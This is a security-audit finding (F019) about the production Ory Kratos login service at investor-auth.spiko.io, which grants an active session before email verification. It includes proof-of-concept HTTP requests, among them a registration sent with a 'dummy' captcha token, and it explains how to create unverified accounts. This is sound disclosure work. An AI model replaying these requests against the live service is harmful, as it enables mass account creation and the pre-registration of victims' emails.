# F019 - Active Session Issued Before Email Verification

## Summary

| Field | Value |
|-------|-------|
| Severity | Medium |
| CVSS 3.1 | 6.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N) |
| OWASP | A07:2021 - Identification and Authentication Failures |
| Endpoint | `POST https://investor-auth.spiko.io/self-service/registration` |
| Status | Confirmed |

## Description

Upon registration, Ory Kratos immediately returns a fully active session before the user verifies their email address. The `verifiable_addresses[0].verified` is `false` and `status` is `"sent"`, yet `session.active` is `true` and `identity.state` is `"active"`.

## Impact

Combined with F018 (CAPTCHA bypass), an attacker can create unlimited authenticated sessions with arbitrary email addresses without ever verifying ownership. This could enable:
- Creating accounts under email addresses the attacker does not control
- Bypassing email-based access controls if downstream services trust the session without checking verification status
- Pre-registering email addresses of targeted individuals to block their legitimate registration

## Proof

**Request (registration):**
```http
POST /self-service/registration?flow=b3cbe7f8-f57a-49c7-a947-3037458d2931 HTTP/2
Host: investor-auth.spiko.io
Content-Type: application/json

{
  "method": "password",
  "password": "TestP@ssw0rd2026!",
  "transient_payload": {"captcha_token": "dummy"},
  "traits": {
    "first_name": "Test", "last_name": "User1",
    "email": "spiko.test.alpha.29oct@proton.me",
    "preferences": {"locale": "en", "investorAppMode": "standard"}
  }
}
```

**Verification via whoami (using session token from registration response):**
```http
GET /sessions/whoami HTTP/2
Host: investor-auth.spiko.io
X-Session-Token: ory_st_xkEYUsYe6rtVmns25Z931wsWrfgHLJPY
```

**Response:**
```json
{
  "active": true,
  "identity": {
    "id": "45b3fa1e-250a-4e43-95f3-1a5a18e689dc",
    "state": "active",
    "traits": {"email": "spiko.test.alpha.29oct@proton.me"},
    "verifiable_addresses": [{
      "value": "spiko.test.alpha.29oct@proton.me",
      "verified": false,
      "status": "sent"
    }]
  },
  "authenticator_assurance_level": "aal1"
}
```

The session is fully active (`active: true`, `state: "active"`, `aal1`) despite `verified: false`.
